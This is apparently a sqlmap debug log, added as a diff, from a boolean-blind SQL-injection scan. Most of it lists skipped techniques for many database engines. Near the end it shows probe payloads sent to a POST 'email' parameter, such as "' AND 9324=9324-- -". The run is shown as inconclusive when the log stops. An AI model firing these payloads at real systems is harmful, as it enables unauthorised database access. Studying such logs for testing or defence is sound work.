+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server error-based - Stacking (RAISERROR)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Generic inline queries' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL inline queries' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL inline queries' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle inline queries' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SQLite inline queries' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird inline queries' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'ClickHouse inline queries' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries (comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (no semicolon)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - no semicolon)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle AND time-based blind' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle OR time-based blind' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'CUBRID AND time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'CUBRID OR time-based blind (SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'ClickHouse AND time-based blind (sleepEachRow)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'ClickHouse OR time-based blind (sleepEachRow)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_SESSION.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_SESSION.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SAP HANA AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SAP HANA OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SAP HANA AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'SAP HANA time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Generic UNION query (NULL) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Generic UNION query (random number) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Generic UNION query (NULL) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Generic UNION query (random number) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Generic UNION query (NULL) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Generic UNION query (random number) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Generic UNION query (NULL) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Generic UNION query (random number) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Generic UNION query (NULL) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL UNION query (NULL) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL UNION query (random number) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL UNION query (NULL) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL UNION query (random number) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL UNION query (NULL) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL UNION query (random number) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL UNION query (NULL) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL UNION query (random number) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL UNION query (NULL) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [DEBUG] skipping test 'MySQL UNION query (random number) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:25:45] [WARNING] POST parameter '_token' does not seem to be injectable
+[08:25:45] [WARNING] POST parameter 'email' does not appear to be dynamic
+[08:25:45] [PAYLOAD] @EMAIL@' .,,,',,.".-- -
+[08:25:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:45] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:45] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be SQL injectable
+[08:25:45] [PAYLOAD] @EMAIL@' 'uscbXH<'">)NQQtNL-- -
+[08:25:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:46] [INFO] testing for SQL injection on POST parameter 'email'
+[08:25:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:25:46] [PAYLOAD] @EMAIL@'  AND 7828=3235-- -
+[08:25:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:46] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:46] [PAYLOAD] @EMAIL@'  AND 9324=9324-- -
+[08:25:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[08:25:47] [PAYLOAD] -8122'  OR 9265=6296-- -
+[08:25:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:47] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
